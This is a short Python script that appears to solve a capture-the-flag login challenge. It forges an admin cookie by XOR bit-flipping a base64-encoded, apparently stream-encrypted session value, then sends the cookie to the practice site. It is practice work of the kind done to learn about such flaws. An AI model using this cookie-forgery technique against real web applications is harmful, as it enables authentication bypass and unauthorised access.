import base64
import json
import urllib.parse
import requests
'''
a={
    'name': "guest",
    'admin': False}
b=json.dumps(a)
print(b)
print(len(b))
'''

#https://www.php.net/manual/zh/function.json-encode.php
a=b'{"name":"guest","admin":false}'
b=b'{"name":"guest","admin":true}'
#print(len(a))

c="U/osUbnY8nSrWz4WPwKSwWPzKq9tOIQ9eCWnN5E+"
c=base64.b64decode(c)
#print(len(c))

xxx=''
for i in range(len(b)):
    xxx=xxx+chr(a[i]^b[i]^c[i])
cookie=base64.b64encode(xxx.encode('latin1'))
cookie=urllib.parse.quote(cookie)
print(cookie)

url = 'https://hackme.inndy.tw/login5/'
cookies={
    'user5': cookie}
r=requests.get(url,cookies=cookies)
print(r.content)





